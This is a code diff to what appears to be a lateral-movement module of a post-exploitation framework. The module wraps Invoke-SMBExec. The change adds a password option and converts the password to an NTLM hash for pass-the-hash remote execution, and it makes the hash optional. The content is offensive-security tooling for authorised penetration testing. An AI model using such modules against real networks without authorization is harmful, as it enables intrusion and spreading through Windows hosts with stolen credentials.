@@ -53,11 +53,16 @@ class Module:
             'Domain' : {
                 'Description'   :   'Domain.',
                 'Required'      :   False,
+                'Value'         :   '.'
+            },
+            'Password' : {
+                'Description'   :   'Password for the specified username.',
+                'Required'      :   False,
                 'Value'         :   ''
             },
             'Hash' : {
                 'Description'   :   'NTLM Hash in LM:NTLM or NTLM format.',
-                'Required'      :   True,
+                'Required'      :   False,
                 'Value'         :   ''
             },
             'Service' : {
@@ -99,16 +104,20 @@ class Module:
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
         listenerName = self.options['Listener']['Value']
         computerName = self.options['ComputerName']['Value']
         userName = self.options['Username']['Value']
+        Password = self.options['Password']['Value']
         NTLMhash = self.options['Hash']['Value']
         domain = self.options['Domain']['Value']
         service = self.options['Service']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
         proxyCreds = self.options['ProxyCreds']['Value']
+
+        if Password != '':
+            NTLMhash = helpers.binascii.hexlify(helpers.hashlib.new('md4', Password.encode('utf-16le')).digest())
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-SMBExec.ps1"
         if obfuscate:
